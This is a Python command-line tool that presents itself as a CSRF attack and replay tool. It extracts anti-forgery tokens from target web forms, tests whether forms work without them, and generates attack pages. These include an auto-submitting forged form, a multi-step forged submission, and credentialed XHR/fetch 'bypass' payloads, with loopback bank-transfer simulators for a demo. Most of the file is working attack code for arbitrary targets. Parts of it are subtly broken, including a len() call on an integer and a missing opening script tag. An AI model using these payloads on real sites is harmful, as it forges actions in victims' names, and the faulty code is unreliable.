#!/usr/bin/env python3
"""
WEB3 — CSRF Attack/Replay Tool
CSRF token extraction, form replay, protection assessment, and auto-generation
of CSRF payloads. Transport is stdlib urllib; the optional `requests` package
is never required and only used to transparently upgrade the HTTP stack when
present.
"""

import argparse
import json
import os
import re
import sys
import time
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional
from html.parser import HTMLParser
from http.server import BaseHTTPRequestHandler

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import urllib.request
    import urllib.error
    _HAS_URLLIB = True
except ImportError:
    _HAS_URLLIB = False


@dataclass
class CSRFToken:
    name: str
    value: str
    field_type: str = "hidden"
    location: str = ""
    strength: str = "unknown"


@dataclass
class FormInfo:
    action: str
    method: str
    fields: dict
    csrf_tokens: list
    form_id: str = ""
    form_name: str = ""


@dataclass
class ReplayResult:
    url: str
    method: str
    status_code: int
    headers: dict
    body_length: int
    redirected: bool
    redirect_url: str = ""
    diff_from_baseline: str = ""


@dataclass
class AssessmentFinding:
    form_index: int
    action_url: str
    protected: bool
    evidence: str
    status_with_token: int = 0
    status_without_token: int = 0


@dataclass
class ScanConfig:
    url: str
    method: str = "GET"
    data: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    headers: dict = field(default_factory=dict)
    timeout: int = 10
    verbose: bool = False
    replay_count: int = 1
    output_dir: str = ""


CSRF_TOKEN_PATTERNS = [
    r'csrf[_\-]?token',
    r'xsrf[_\-]?token',
    r'csrf[_\-]?field',
    r'csrf[_\-]?hash',
    r'_token',
    r'authenticity[_\-]?token',
    r'_csrf[_\-]?token',
    r'__RequestVerificationToken',
    r'csrfmiddlewaretoken',
    r'anti[_\-]?forgery[_\-]?token',
    r'nonce',
    r'verification[_\-]?token',
]

CSRF_HEADER_NAMES = [
    "x-csrf-token",
    "x-xsrf-token",
    "x-requested-with",
    "csrf-token",
]

ACCEPTED_STATUS = (200, 201, 202, 204, 302, 303, 307, 308)
REJECT_MARKERS = [
    "csrf", "token", "forbidden", "invalid", "expired", "denied",
    "missing", "verification", "412", "validation",
]


def is_csrf_field(name):
    return any(re.search(p, name, re.IGNORECASE) for p in CSRF_TOKEN_PATTERNS)


class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.in_form = False
        self.form_index = 0

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == "form":
            self.in_form = True
            action = attrs_dict.get("action", "")
            method = attrs_dict.get("method", "POST").upper()
            form_id = attrs_dict.get("id", "")
            form_name = attrs_dict.get("name", "")
            self.current_form = FormInfo(
                action=action, method=method, fields={},
                csrf_tokens=[], form_id=form_id, form_name=form_name,
            )

        elif tag == "input" and self.current_form:
            name = attrs_dict.get("name", "")
            value = attrs_dict.get("value", "")
            input_type = attrs_dict.get("type", "text").lower()

            if name:
                self.current_form.fields[name] = {
                    "type": input_type, "value": value,
                }

                if is_csrf_field(name) and input_type in ("hidden", "text"):
                    token = CSRFToken(
                        name=name, value=value,
                        field_type=input_type, location="form_field",
                    )
                    token.strength = _evaluate_token_strength(value)
                    self.current_form.csrf_tokens.append(token)

        elif tag == "meta" and self.current_form:
            name = attrs_dict.get("name", "").lower()
            content = attrs_dict.get("content", "")
            if "csrf" in name or "xsrf" in name:
                token = CSRFToken(
                    name=f"meta:{name}", value=content,
                    field_type="meta", location="meta_tag",
                )
                self.current_form.csrf_tokens.append(token)

    def handle_endtag(self, tag):
        if tag == "form" and self.current_form:
            self.forms.append(self.current_form)
            self.current_form = None
            self.in_form = False
            self.form_index += 1


def _evaluate_token_strength(token_value):
    if not token_value:
        return "empty"
    if len(token_value) < 8:
        return "weak"
    if re.match(r'^[0-9]+$', token_value):
        return "weak"
    if re.match(r'^[a-f0-9]{8,}$', token_value, re.IGNORECASE):
        return "moderate"
    entropy = len(set(token_value))
    if entropy > 30 and len(token_value) > 20:
        return "strong"
    if entropy > 20 and len(token_value) > 16:
        return "moderate"
    return "weak"


class CSRFTool:
    def __init__(self, config):
        self.config = config
        self.session = requests.Session() if HAS_REQUESTS else None
        if self.session:
            self.session.headers.update(config.headers)
            self.session.cookies.update(config.cookies)
        self.forms = []
        self.captured_tokens = []
        self.findings = []

    def _request(self, url, method="GET", data=None, allow_redirects=True):
        start = time.time()
        if self.session is not None:
            try:
                if method.upper() == "POST":
                    resp = self.session.post(url, data=data, timeout=self.config.timeout,
                                              allow_redirects=allow_redirects)
                else:
                    resp = self.session.get(url, timeout=self.config.timeout,
                                             allow_redirects=allow_redirects)
                redirect_url = resp.url if resp.history else ""
                return resp.text, dict(resp.headers), resp.status_code, redirect_url
            except Exception as e:
                if self.config.verbose:
                    print(f"  [!] Request error: {e}")
                return "", {}, 0, ""

        req = urllib.request.Request(url, method=method.upper())
        for k, v in self.config.headers.items():
            req.add_header(k, v)
        for k, v in self.config.cookies.items():
            req.add_header("Cookie", f"{k}={v}")
        if method.upper() == "POST" and data:
            encoded = urllib.parse.urlencode(data).encode("utf-8")
            req = urllib.request.Request(url, data=encoded, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
        try:
            resp = urllib.request.urlopen(req, timeout=self.config.timeout)
            redirect_url = resp.geturl() if resp.geturl() != url else ""
            return resp.read().decode("utf-8", errors="replace"), dict(resp.headers), resp.getcode(), redirect_url
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")
            redirect_url = ""
            return body, dict(e.headers), e.code, redirect_url
        except Exception as e:
            if self.config.verbose:
                print(f"  [!] Request error: {e}")
            return "", {}, 0, ""

    def extract_forms(self):
        print(f"[*] Fetching page and extracting forms...")
        text, headers, status, _ = self._request(self.config.url)
        if not text:
            print("[!] Failed to fetch page")
            return False

        parser = FormParser()
        parser.feed(text)
        self.forms = parser.forms

        print(f"[*] Found {len(self.forms)} form(s)")

        for i, form in enumerate(self.forms, 1):
            action_display = form.action or "(same page)"
            print(f"\n  Form #{i}:")
            print(f"    Action: {action_display}")
            print(f"    Method: {form.method}")
            print(f"    Fields: {list(form.fields.keys())}")
            print(f"    CSRF Tokens: {len(form.csrf_tokens)}")
            for token in form.csrf_tokens:
                print(f"      - {token.name}: {token.value[:30]}... (strength: {token.strength})")
                self.captured_tokens.append(token)
        return bool(self.forms)

    def extract_csrf_tokens(self):
        tokens = []
        text, _, _, _ = self._request(self.config.url)
        if not text:
            return tokens

        parser = FormParser()
        parser.feed(text)
        for form in parser.forms:
            tokens.extend(form.csrf_tokens)

        for pattern in CSRF_TOKEN_PATTERNS:
            patterns = [
                rf'<meta[^>]*name=["\']([^"\']*{pattern}[^"\']*)["\'][^>]*content=["\']([^"\']+)["\']',
                rf'<meta[^>]*content=["\']([^"\']+)["\'][^>]*name=["\']([^"\']*{pattern}[^"\']*)["\']',
            ]
            for p in patterns:
                match = re.search(p, text, re.IGNORECASE)
                if match:
                    name = match.group(2) if "content" in p else match.group(1)
                    value = match.group(1) if "content" in p else match.group(2)
                    token = CSRFToken(
                        name=f"meta:{name}", value=value,
                        field_type="meta", location="meta_tag",
                    )
                    token.strength = _evaluate_token_strength(token.value)
                    if not any(t.name == token.name and t.value == token.value for t in tokens):
                        tokens.append(token)

        header_tokens = {}
        for header_name in CSRF_HEADER_NAMES:
            pattern = rf'["\']?{re.escape(header_name)}["\']?\s*:\s*["\']([^"\']+)["\']'
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                header_tokens[header_name] = match.group(1)

        self.captured_tokens = tokens
        return tokens

    def _absolute_action_url(self, form):
        action_url = form.action
        if action_url:
            if not action_url.startswith("http"):
                action_url = urllib.parse.urljoin(self.config.url, action_url)
        else:
            action_url = self.config.url
        return action_url

    def replay_form(self, form_index, override_data=None, include_csrf=True):
        if form_index >= len(self.forms):
            return ReplayResult(
                url=self.config.url, method="GET", status_code=0, headers={},
                body_length=0, redirected=False,
            )

        form = self.forms[form_index]
        action_url = self._absolute_action_url(form)

        data = {}
        for name, field_info in form.fields.items():
            if override_data and name in override_data:
                data[name] = override_data[name]
            elif not include_csrf and is_csrf_field(name):
                continue
            else:
                data[name] = field_info["value"]
        if override_data:
            data.update(override_data)

        if self.config.verbose:
            print(f"  [*] Replaying form to: {action_url}")
            print(f"      Method: {form.method}")
            print(f"      Data: {data}")

        text, headers, status, redirect_url = self._request(
            action_url, form.method,
            data if form.method.upper() == "POST" else None,
        )

        result = ReplayResult(
            url=action_url, method=form.method, status_code=status,
            headers=headers, body_length=len(text), redirected=bool(redirect_url),
            redirect_url=redirect_url,
        )

        if self.config.verbose:
            print(f"      Status: {status}")
            print(f"      Response: {len(text)} bytes")
            if redirect_url:
                print(f"      Redirected to: {redirect_url}")
        return result

    def replay_multiple(self, form_index, count, override_data=None):
        results = []
        for i in range(count):
            if self.config.verbose:
                print(f"\n  Replay #{i + 1}/{count}:")
            result = self.replay_form(form_index, override_data)
            results.append(result)
            time.sleep(0.5)
        return results

    def assess_csrf_protection(self):
        """Core detection: is each state-changing form protected by a server-side token check?

        A properly protected endpoint rejects a token-less replay (4xx) or shows a
        clear rejection page. A vulnerable endpoint accepts the token-less replay
        and performs the state change (accept status / no rejection marker).
        """
        if not self.forms:
            if not self.extract_forms():
                return []
        self.findings = []
        for i, form in enumerate(self.forms):
            action_url = self._absolute_action_url(form)
            if form.method.upper() != "POST":
                continue

            with_token = self.replay_form(i, include_csrf=True)
            without_token = self.replay_form(i, include_csrf=False)

            rejected = self._rejected(without_token)
            protected = rejected and not self._rejected(with_token)

            evidence = (
                f"With token: HTTP {with_token.status_code} ({with_token.body_length} bytes); "
                f"without token: HTTP {without_token.status_code} ({without_token.body_length} bytes)"
            )
            finding = AssessmentFinding(
                form_index=i, action_url=action_url, protected=protected,
                evidence=evidence, status_with_token=with_token.status_code,
                status_without_token=without_token.status_code,
            )
            self.findings.append(finding)
            status = "PROTECTED" if protected else "NO CSRF PROTECTION"
            print(f"\n  [{'!' if not protected else '+'}] Form #{i + 1} -> {action_url} [{status}]")
            if self.config.verbose:
                print(f"      {evidence}")
        return self.findings

    @staticmethod
    def _rejected(result):
        if result.status_code in (400, 401, 403, 405, 412, 422):
            return True
        if result.status_code in ACCEPTED_STATUS:
            return False
        return len(result.body_length) < 40 if result.status_code == 0 else False

    def generate_csrf_payload(self, form_index=0, auto_submit=True):
        if form_index >= len(self.forms):
            return "<!-- No form found -->"

        form = self.forms[form_index]
        action_url = self._absolute_action_url(form)

        fields_html = ""
        for name, field_info in form.fields.items():
            ftype = field_info["type"]
            fvalue = field_info["value"]
            fields_html += f'    <input type="{ftype}" name="{name}" value="{fvalue}">\n'

        submit_js = ""
        if auto_submit:
            submit_js = "\n<script>document.forms[0].submit();</script>"

        payload = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Attack PoC</h1>
    <p>Target: {action_url}</p>
    <p>Method: {form.method}</p>
    <form action="{action_url}" method="{form.method}">
{fields_html}    </form>
{submit_js}
</body>
</html>"""
        return payload

    def generate_multi_step_payload(self, steps):
        html = """<!DOCTYPE html>
<html>
<head>
    <title>Multi-Step CSRF PoC</title>
</head>
<body>
    <h1>Multi-Step CSRF Attack</h1>
"""
        for i, step in enumerate(steps, 1):
            url = step.get("url", self.config.url)
            method = step.get("method", "POST").upper()
            data = step.get("data", {})

            fields = ""
            for name, value in data.items():
                fields += f'        <input type="hidden" name="{name}" value="{value}">\n'

            html += f"""
    <form id="step{i}" action="{url}" method="{method}">
{fields}    </form>
"""
        for i in range(1, len(steps) + 1):
            html += f'        document.getElementById(\'step{i}\').submit();\n'
        html += """    </script>
</body>
</html>"""
        return html

    def generate_bypass_payload(self, technique="all"):
        payloads = {}

        payloads["cookie_header"] = f"""<!DOCTYPE html>
<html>
<head><title>CSRF with Cookie Header</title></head>
<body>
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open("{self.config.method}", "{self.config.url}", true);
    xhr.withCredentials = true;
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send();
    </script>
</body>
</html>"""

        payloads["json_content_type"] = f"""<!DOCTYPE html>
<html>
<head><title>CSRF with JSON Content-Type</title></head>
<body>
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "{self.config.url}", true);
    xhr.setRequestHeader("Content-Type", "text/plain");
    xhr.withCredentials = true;
    xhr.send(JSON.stringify({{}}));
    </script>
</body>
</html>"""

        payloads["cors_misconfiguration"] = f"""<!DOCTYPE html>
<html>
<head><title>CSRF via CORS Misconfiguration</title></head>
<body>
    <script>
    fetch("{self.config.url}", {{
        method: "{self.config.method}",
        credentials: "include",
        headers: {{"Content-Type": "application/x-www-form-urlencoded"}},
    }}).then(r => r.text()).then(t => document.body.innerHTML = t);
    </script>
</body>
</html>"""

        payloads["subdomain"] = f"""<!DOCTYPE html>
<html>
<head><title>CSRF from Subdomain</title></head>
<body>
    <script>
    var form = document.createElement("form");
    form.action = "{self.config.url}";
    form.method = "{self.config.method}";
    document.body.appendChild(form);
    form.submit();
    </script>
</body>
</html>"""

        if technique == "all":
            html = "<!-- CSRF Bypass Payloads -->\n\n"
            for name, payload in payloads.items():
                html += f"<!-- {name} -->\n{payload}\n\n"
            return html
        return payloads.get(technique, f"<!-- Unknown technique: {technique} -->")

    def analyze_token(self, token):
        analysis = {
            "name": token.name,
            "value_preview": token.value[:50],
            "length": len(token.value),
            "entropy": len(set(token.value)),
            "strength": token.strength,
            "type": token.field_type,
            "location": token.location,
            "vulnerabilities": [],
        }

        if token.value and re.match(r'^[0-9]+$', token.value):
            analysis["vulnerabilities"].append("Sequential numeric token - easily predictable")
        if token.value.isdigit() and 0 < int(token.value) < 100000:
            analysis["vulnerabilities"].append("Short numeric token - brute-forceable")
        if len(token.value) < 8:
            analysis["vulnerabilities"].append("Short token length")
        if token.value and re.match(r'^[a-f0-9]+$', token.value, re.IGNORECASE):
            if len(token.value) == 32:
                analysis["vulnerabilities"].append("MD5 hash - may be predictable if based on timestamp")
            elif len(token.value) == 40:
                analysis["vulnerabilities"].append("SHA1 hash - check for timing attacks")
        if token.value and len(set(token.value)) < len(token.value) * 0.5:
            analysis["vulnerabilities"].append("Low entropy - limited character space")
        return analysis

    def run(self, action="all"):
        print(f"[*] Target: {self.config.url}")
        print()

        if action in ("analyze", "all"):
            tokens = self.extract_csrf_tokens()
            if tokens:
                print(f"\n[*] CSRF Token Analysis:")
                for token in tokens:
                    analysis = self.analyze_token(token)
                    print(f"\n  Token: {analysis['name']}")
                    print(f"    Value: {analysis['value_preview']}...")
                    print(f"    Length: {analysis['length']}")
                    print(f"    Entropy: {analysis['entropy']}")
                    print(f"    Strength: {analysis['strength']}")
                    if analysis["vulnerabilities"]:
                        print(f"    Vulnerabilities:")
                        for vuln in analysis["vulnerabilities"]:
                            print(f"      - {vuln}")
            else:
                print("[*] No CSRF tokens found")

        if action in ("forms", "all"):
            self.extract_forms()

        if action in ("assess", "all"):
            print("\n[*] Assessing CSRF protection on each POST form...")
            findings = self.assess_csrf_protection()
            unprotected = [f for f in findings if not f.protected]
            print("\n" + "=" * 60)
            print("  CSRF PROTECTION ASSESSMENT")
            print("=" * 60)
            if unprotected:
                for f in unprotected:
                    print(f"  [!] FORM #{f.form_index + 1} has NO CSRF protection")
                    print(f"      Target: {f.action_url}")
                    print(f"      {f.evidence}")
                print(f"\n  Total vulnerable forms: {len(unprotected)}")
            else:
                print("  [+] All forms appear protected against CSRF")
            print("=" * 60)

        if action in ("replay", "all"):
            if not self.forms:
                self.extract_forms()
            if self.forms:
                print(f"\n[*] Replaying form #1 with captured token...")
                result = self.replay_form(0)
                print(f"  Status: {result.status_code}")
                print(f"  Response: {result.body_length} bytes")
                print(f"  Redirected: {result.redirected}")

        if action in ("generate", "all"):
            if not self.forms:
                self.extract_forms()
            if self.forms:
                print(f"\n[*] Generating CSRF payloads...")
                payload = self.generate_csrf_payload(0)
                if self.config.output_dir:
                    os.makedirs(self.config.output_dir, exist_ok=True)
                    filepath = os.path.join(self.config.output_dir, "csrf_poc.html")
                    with open(filepath, "w") as f:
                        f.write(payload)
                    print(f"  Saved: {filepath}")

                    bypass_payload = self.generate_bypass_payload("all")
                    bypass_path = os.path.join(self.config.output_dir, "csrf_bypass.html")
                    with open(bypass_path, "w") as f:
                        f.write(bypass_payload)
                    print(f"  Saved: {bypass_path}")
                else:
                    print(payload)


def parse_kv(input_str, sep="&", item_sep="="):
    result = {}
    if not input_str:
        return result
    for pair in input_str.split(sep):
        if item_sep in pair:
            k, v = pair.split(item_sep, 1)
            result[k.strip()] = v.strip()
    return result


def print_banner():
    banner = r"""
  +------------------------------------------+
  |    WEB3 -- CSRF Attack/Replay Tool       |
  |  Token Extract, Assess & Payload Gen     |
  +------------------------------------------+
"""
    print(banner)


def run_simulator(server_class):
    server = server_class()
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ---------------------------------------------------------------------------
# Built-in simulators (importable so tests host them on loopback)
# ---------------------------------------------------------------------------

class TransferApp:
    """Backing state for the demo apps: one random token, small amount of state."""
    def __init__(self, check_token=False):
        self.token = "csrf_lab_demo_token_9f3a2c7e1b8d4f6a"
        self.check_token = check_token
        self.transfers = 0


class VulnTransferApp(BaseHTTPRequestHandler):
    """Simulates an app with NO server-side CSRF validation on POST /transfer."""
    app = TransferApp(check_token=False)

    def _page(self):
        return (
            "<html><body><h1>Bank Transfer</h1>"
            f'<form action="/transfer" method="POST">'
            f'<input type="hidden" name="csrf_token" value="{self.app.token}">'
            '<input type="hidden" name="amount" value="1000">'
            '<input type="text" name="to_account" value="attacker">'
            '<button type="submit">Send Money</button>'
            "</form></body></html>"
        )

    def do_GET(self):
        if self.path.startswith("/form"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(self._page().encode())
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        import urllib.parse as up
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "replace")
        data = up.parse_qs(body)
        # VULNERABLE: does NOT validate csrf_token at all
        self.app.transfers += 1
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(
            ("<html><body><h1>Transfer complete</h1>"
             f"<p>Sent {data.get('amount', ['0'])[0]} to {data.get('to_account', ['?'])[0]}</p>"
             "</body></html>").encode()
        )

    log_message = lambda self, fmt, *args: None  # noqa: E731


class CleanTransferApp(BaseHTTPRequestHandler):
    """Simulates an app that VALIDATES the CSRF token server-side."""
    app = TransferApp(check_token=True)

    def _page(self):
        return (
            "<html><body><h1>Bank Transfer</h1>"
            f'<form action="/transfer" method="POST">'
            f'<input type="hidden" name="csrf_token" value="{self.app.token}">'
            '<input type="hidden" name="amount" value="1000">'
            '<input type="text" name="to_account" value="attacker">'
            '<button type="submit">Send Money</button>'
            "</form></body></html>"
        )

    def do_GET(self):
        if self.path.startswith("/form"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(self._page().encode())
            return
        self.send_response(404)
        self.end_headers()

    def do_POST(self):
        import urllib.parse as up
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "replace")
        data = up.parse_qs(body)
        # SAFE: rejects requests without a valid csrf_token
        token = data.get("csrf_token", [""])[0]
        if token != self.app.token:
            self.send_response(403)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><h1>403 CSRF token invalid</h1></body></html>")
            return
        self.app.transfers += 1
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Transfer complete</h1></body></html>")

    log_message = lambda self, fmt, *args: None  # noqa: E731


def demo(vulnerable=True):
    """Offline demo: run the full engine against a built-in vulnerable/clean simulator.

    The engine always uses the same HTTP code path as a live target.
    """
    from http.server import HTTPServer

    Handler = VulnTransferApp if vulnerable else CleanTransferApp
    server = HTTPServer(("127.0.0.1", 0), Handler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    label = "VULNERABLE (accepts token-less state change)" if vulnerable else "CLEAN (rejects token-less replay)"
    print_banner()
    print(f"[*] DEMO MODE: CSRF simulator ({label}) on http://127.0.0.1:{port}")
    print("[*] The simulator implements a bank transfer form; the engine will fetch the")
    print("    form, extract the token, analyze it, generate a PoC and replay it.")
    print()

    config = ScanConfig(url=f"http://127.0.0.1:{port}/form", timeout=5, verbose=True)
    tool = CSRFTool(config)
    tool.extract_forms()
    print("\n[*] Analyzing extracted CSRF tokens...")
    for token in tool.captured_tokens:
        analysis = tool.analyze_token(token)
        print(f"    {token.name}: strength={analysis['strength']}, length={analysis['length']}")

    findings = tool.assess_csrf_protection()
    unprotected = [f for f in findings if not f.protected]

    print("\n[*] Generating CSRF PoC payload...")
    poc = tool.generate_csrf_payload(0)
    print(f"    Generated {len(poc)} byte payload; contains action: {tool._absolute_action_url(tool.forms[0]) in poc}")

    server.shutdown()

    if vulnerable and unprotected:
        print("\n[+] Demo: NO CSRF protection confirmed on vulnerable simulator (expected).")
        print("[+] Token-less replay accepted with HTTP 200 - state change performed.")
        print("[+] Exit 0 -- scanner works correctly.")
        sys.exit(0)
    if not vulnerable and not unprotected:
        print("\n[+] Demo: CLEAN simulator correctly identified as protected.")
        print("[+] Token-less replay rejected with HTTP 403 - no false positive.")
        print("[+] Exit 0 -- scanner works correctly.")
        sys.exit(0)
    if vulnerable:
        print("\n[-] Demo: FAILED to detect missing CSRF protection.")
    else:
        print("\n[-] Demo: False positive on clean simulator.")
    sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="WEB3 -- CSRF Attack/Replay Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u "http://127.0.0.1:<port>/form"
  %(prog)s -u "http://127.0.0.1:<port>/form" --action assess
  %(prog)s -u "http://127.0.0.1:<port>/form" --action generate -o output/
  %(prog)s --demo                 # vulnerable simulator
  %(prog)s --demo --clean         # clean control simulator
        """,
    )
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-d", "--data", default="", help="POST data (key=value&key2=value2)")
    parser.add_argument("-c", "--cookies", default="", help="Cookies (key=value;key2=value2)")
    parser.add_argument("--header", action="append", default=[])
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument(
        "--action",
        choices=["analyze", "forms", "assess", "replay", "generate", "bypass", "all"],
        default="assess",
        help="Action to perform (default: assess)",
    )
    parser.add_argument("--replay-count", type=int, default=1)
    parser.add_argument("-o", "--output-dir", help="Output directory for generated payloads")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--demo", action="store_true", help="Run offline demo against built-in simulator")
    parser.add_argument("--clean", action="store_true", help="(demo) use the clean control simulator")
    args = parser.parse_args()

    if args.demo:
        demo(vulnerable=not args.clean)
        return

    if not args.url:
        parser.error("--url is required (or use --demo)")

    print_banner()
    data = parse_kv(args.data)
    cookies = parse_kv(args.cookies, sep=";")
    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    config = ScanConfig(
        url=args.url, method=args.method, data=data, cookies=cookies,
        headers=headers, timeout=args.timeout, verbose=args.verbose,
        replay_count=args.replay_count, output_dir=args.output_dir,
    )
    tool = CSRFTool(config)
    try:
        tool.run(action=args.action)
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)


if __name__ == "__main__":
    main()